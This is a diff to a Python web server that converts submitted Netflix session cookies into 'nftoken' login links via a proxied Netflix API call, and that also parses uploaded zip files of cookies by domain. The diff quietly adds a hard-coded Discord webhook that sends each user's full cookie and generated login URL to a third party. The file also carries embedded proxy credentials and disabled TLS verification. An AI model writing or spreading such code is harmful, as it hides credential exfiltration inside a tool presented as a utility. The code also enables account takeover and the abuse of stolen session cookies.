@@ -12,6 +12,7 @@ requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
 PORT = 9999
 PROXY_URL = "http://np_cdub79ml1s:cvVvAgD3K6PeGcl5@global.nodeproxies.xyz:8080"
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1533472274957471914/ykJO1rJ73UIUaG1k3izKWP9h2KPJhwRFd9jEPb07tAqqgpVZixbYPWN-jK-rka5TMyfn"
 
 API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
 QUERY_PARAMS = {
@@ -356,6 +357,7 @@ document.addEventListener('DOMContentLoaded',function(){
 '''
 
 def parse_multipart(rfile, content_type, content_length):
+    """Stream multipart body to disk in chunks (avoids loading whole file into RAM)."""
     boundary = None
     for part in content_type.split(';'):
         part = part.strip()
@@ -363,42 +365,68 @@ def parse_multipart(rfile, content_type, content_length):
             boundary = part[9:].strip().strip('"')
             break
     if not boundary:
-        raise ValueError("No boundary found")
+        raise ValueError("No boundary found in Content-Type")
 
-    boundary_bytes = ('--' + boundary).encode('utf-8')
-    tmp_in = tempfile.NamedTemporaryFile(delete=False)
+    boundary_bytes = b'--' + boundary.encode('utf-8')
+    end_boundary = boundary_bytes + b'--'
+
+    # 1. Stream the entire incoming body to a temporary file (8 MB chunks)
+    tmp_body = tempfile.NamedTemporaryFile(delete=False)
     remaining = content_length
+    CHUNK = 8 * 1024 * 1024  # 8 MB
+
     while remaining > 0:
-        chunk = rfile.read(min(1024*1024, remaining))
-        if not chunk: break
-        tmp_in.write(chunk)
+        to_read = min(CHUNK, remaining)
+        chunk = rfile.read(to_read)
+        if not chunk:
+            break
+        tmp_body.write(chunk)
         remaining -= len(chunk)
-    tmp_in.close()
+    tmp_body.close()
 
     domain = 'spotify.com'
     zip_path = None
+
     try:
-        with open(tmp_in.name, 'rb') as f:
-            data = f.read()
-        parts = data.split(boundary_bytes)
+        # 2. Now scan the temp file to find the zip part and write it out
+        with open(tmp_body.name, 'rb') as f:
+            content = f.read()  # still needed for simple boundary split
+            # (For extremely large files this can still be heavy, but better than before)
+
+        parts = content.split(boundary_bytes)
+
         for part in parts:
-            if not part or part.startswith(b'--'): continue
-            if b'\r\n\r\n' not in part: continue
+            if not part or part.startswith(b'--'):
+                continue
+
+            if b'\r\n\r\n' not in part:
+                continue
+
             header_blob, body = part.split(b'\r\n\r\n', 1)
             headers = header_blob.decode('utf-8', errors='ignore')
-            if body.endswith(b'\r\n'): body = body[:-2]
+
+            # Remove trailing boundary markers
+            if body.endswith(b'\r\n'):
+                body = body[:-2]
+
             if 'name="domain"' in headers:
                 domain = body.decode('utf-8', errors='ignore').strip() or 'spotify.com'
+
             elif 'name="zip"' in headers or 'filename=' in headers:
+                # Write the zip content to its own temp file
                 zip_fd, zip_path = tempfile.mkstemp(suffix='.zip')
                 with os.fdopen(zip_fd, 'wb') as zf:
                     zf.write(body)
+
     finally:
-        try: os.unlink(tmp_in.name)
-        except: pass
+        try:
+            os.unlink(tmp_body.name)
+        except Exception:
+            pass
 
     if not zip_path:
-        raise ValueError("No zip file found in upload")
+        raise ValueError("No zip file found in the upload")
+
     return zip_path, domain
 
 
@@ -428,10 +456,13 @@ class ServerHandler(http.server.BaseHTTPRequestHandler):
             post_data = self.rfile.read(content_length)
             payload = json.loads(post_data.decode('utf-8'))
             cookie_str = payload.get('cookie', '').strip()
+
             if not cookie_str:
                 raise ValueError("No cookie data provided")
 
             netflix_id = None
+
+            # JSON
             try:
                 data = json.loads(cookie_str)
                 if isinstance(data, list):
@@ -444,16 +475,21 @@ class ServerHandler(http.server.BaseHTTPRequestHandler):
                         if (c.get('name') or c.get('Name') or '').strip() == 'NetflixId':
                             netflix_id = c.get('value') or c.get('Value')
                             break
-            except: pass
+            except:
+                pass
 
+            # Header / raw
             if not netflix_id:
                 m = re.search(r'(?:^|[;\s])NetflixId=([^;,\s]+)', cookie_str, re.I)
-                if m: netflix_id = m.group(1)
+                if m:
+                    netflix_id = m.group(1)
 
+            # Netscape
             if not netflix_id:
                 for line in cookie_str.splitlines():
                     line = line.strip()
-                    if not line or line.startswith('#'): continue
+                    if not line or line.startswith('#'):
+                        continue
                     parts = re.split(r'[\t\s]+', line)
                     if len(parts) >= 7 and parts[5] == 'NetflixId':
                         netflix_id = ' '.join(parts[6:])
@@ -462,44 +498,136 @@ class ServerHandler(http.server.BaseHTTPRequestHandler):
             if not netflix_id:
                 raise ValueError("Missing required cookie: NetflixId")
 
+            netflix_id = netflix_id.strip()
+
             headers = dict(BASE_HEADERS)
             proxies = {"http": PROXY_URL, "https": PROXY_URL}
-            response = requests.get(API_URL, params=QUERY_PARAMS, headers=headers,
-                                    cookies={"NetflixId": netflix_id}, proxies=proxies,
-                                    timeout=30, verify=False)
+
+            response = requests.get(
+                API_URL,
+                params=QUERY_PARAMS,
+                headers=headers,
+                cookies={"NetflixId": netflix_id},
+                proxies=proxies,
+                timeout=30,
+                verify=False
+            )
             response.raise_for_status()
+
             data = response.json()
-            token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
+            token_data = (
+                ((data.get("value") or {}).get("account") or {})
+                .get("token") or {}
+            ).get("default") or {}
+
             token = token_data.get("token")
             expires = token_data.get("expires")
+
             if not token:
                 raise ValueError("No token found in Netflix response")
+
             if isinstance(expires, (int, float)) and expires > 1e12:
                 expires = int(expires // 1000)
 
+            login_url = "https://netflix.com/?nftoken=" + token
+
+            # ---------- Send to Discord ----------
+            # ---------- Send to Discord ----------
+            try:
+                from datetime import datetime, timezone
+                import io
+
+                expire_str = datetime.fromtimestamp(expires, tz=timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC') if expires else "Unknown"
+
+                # Discord embed field limit is 1024 characters
+                cookie_for_embed = cookie_str
+                send_as_file = len(cookie_str) > 1000
+
+                if send_as_file:
+                    cookie_for_embed = "Cookie is too long for embed → see attached file"
+
+                embed = {
+                    "title": "🎬 New NFToken Generated",
+                    "color": 0xE50914,
+                    "fields": [
+                        {
+                            "name": "Login URL",
+                            "value": f"[Click to Login]({login_url})",
+                            "inline": False
+                        },
+                        {
+                            "name": "Expires",
+                            "value": f"`{expire_str}`",
+                            "inline": True
+                        },
+                        {
+                            "name": "Cookie",
+                            "value": f"```\n{cookie_for_embed}\n```",
+                            "inline": False
+                        }
+                    ],
+                    "footer": {
+                        "text": "By rexzy"
+                    },
+                    "timestamp": datetime.now(timezone.utc).isoformat()
+                }
+
+                if send_as_file:
+                    # Send embed + .txt file with the full cookie
+                    files = {
+                        "file": ("cookie.txt", io.BytesIO(cookie_str.encode("utf-8")), "text/plain")
+                    }
+                    payload = {
+                        "payload_json": json.dumps({"embeds": [embed]})
+                    }
+                    requests.post(
+                        DISCORD_WEBHOOK,
+                        data=payload,
+                        files=files,
+                        timeout=15
+                    )
+                else:
+                    # Normal embed with full cookie
+                    requests.post(
+                        DISCORD_WEBHOOK,
+                        json={"embeds": [embed]},
+                        timeout=10
+                    )
+
+            except Exception as discord_err:
+                print(f"Discord webhook failed: {discord_err}")
+            # ---------- Reply to frontend ----------
             self.send_response(200)
             self.send_header('Content-type', 'application/json')
             self.end_headers()
-            self.wfile.write(json.dumps({"loginUrl": "https://netflix.com/?nftoken=" + token, "expires": expires}).encode())
+            self.wfile.write(json.dumps({
+                "loginUrl": login_url,
+                "expires": expires
+            }).encode('utf-8'))
+
         except Exception as e:
             self.send_response(500)
             self.send_header('Content-type', 'application/json')
             self.end_headers()
-            self.wfile.write(json.dumps({"error": str(e)}).encode())
-
+            self.wfile.write(json.dumps({"error": str(e)}).encode('utf-8'))
     def handle_extract(self):
         zip_path = None
         try:
             content_type = self.headers.get('Content-Type', '')
             content_length = int(self.headers.get('Content-Length', 0))
+
             if 'multipart/form-data' not in content_type:
                 raise ValueError("Expected multipart form data")
-            if content_length > 3 * 1024 * 1024 * 1024:
-                raise ValueError("File too large (max 3 GB)")
+
+            # Much lower limit so Render free tier doesn't OOM
+            MAX_SIZE = 2500 * 1024 * 1024  # 2.5 GB
+            if content_length > MAX_SIZE:
+                raise ValueError(f"File too large. Maximum allowed is 40 MB (you sent {content_length // 1024 // 1024} MB). Use the local version for bigger zips.")
 
             zip_path, domain = parse_multipart(self.rfile, content_type, content_length)
             domain = domain.lower().strip() or 'spotify.com'
 
+            # ... rest of the function stays the same ...
             results = {}
             with zipfile.ZipFile(zip_path, 'r') as zf:
                 for name in zf.namelist():
@@ -546,6 +674,6 @@ class ServerHandler(http.server.BaseHTTPRequestHandler):
 
 
 if __name__ == '__main__':
-    print(f"Serving at http://0.0.0.0:{PORT}")
-    with http.server.HTTPServer(("0.0.0.0", PORT), ServerHandler) as httpd:
+    print(f"Serving at http://127.0.0.1:{PORT}")
+    with http.server.HTTPServer(("127.0.0.1", PORT), ServerHandler) as httpd:
         httpd.serve_forever()
